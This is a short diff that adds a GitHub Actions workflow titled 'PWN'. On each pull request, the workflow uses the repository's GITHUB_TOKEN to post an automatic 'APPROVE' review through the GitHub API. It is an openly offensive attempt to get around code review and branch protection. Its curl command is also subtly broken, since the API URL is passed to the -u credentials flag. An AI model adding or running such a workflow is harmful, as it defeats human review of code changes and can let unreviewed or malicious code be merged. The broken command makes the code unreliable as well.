@@ -1,0 +1,18 @@
+name: PWN
+
+on: pull_request
+
+permissions:
+  pull-requests: write
+jobs:
+  approve:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          curl -X POST \
+          -u 'https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/reviews' \
+          -H 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          -H 'Content-Type: application/json' \
+          -d '{"event":"APPROVE"}'
+
